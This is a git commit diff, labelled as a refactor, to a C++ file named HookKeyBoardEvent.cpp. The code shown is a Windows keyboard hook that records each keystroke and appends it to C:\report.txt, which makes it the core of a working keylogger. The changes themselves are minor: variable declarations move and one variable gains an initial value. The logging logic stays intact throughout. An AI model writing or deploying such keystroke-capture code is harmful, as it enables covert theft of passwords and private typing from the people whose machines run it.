27aa0d522a2969680eda1fa06f21b0421f055ac1
Hemingway <coherence0815@gmail.com>
2016-11-09 22:31:08 +0800

    [Refactoring] refactoring the code

--- HookKeyBoardEvent.cpp
+++ HookKeyBoardEvent.cpp
@@ -1,6 +1,5 @@
 LRESULT CALLBACK KeyboardProc (int nCode, WPARAM wParam, LPARAM lParam)
 {
-    char ch = '\0';
     if (((DWORD)lParam & 0x40000000) && (HC_ACTION == nCode))
     {
         if ((wParam == VK_SPACE) || (wParam == VK_RETURN) || (wParam >= 0x2f) && (wParam <= 0x100))
@@ -8,17 +7,17 @@ LRESULT CALLBACK KeyboardProc (int nCode, WPARAM wParam, LPARAM lParam)
             g_fp = fopen("C:\\report.txt", "a+");
             if (wParam == VK_RETURN)
             {
-                ch = '\n';
+                char ch = '\n';
                 fwrite(&ch, 1, 1, g_fp);
             }
             else
             {
                 BYTE keyState[256] = {0};
                 GetKeyboardState(keyState);
-                WORD wBuf;
+                WORD wBuf = 0;
                 UINT uScanCode = 0;
                 ToAscii(wParam, uScanCode, keyState, &wBuf, 0);
-                ch = char(wBuf);
+                char ch = char(wBuf);
                 fwrite(&ch, 1, 1, g_fp);
             }
             fclose(g_fp);
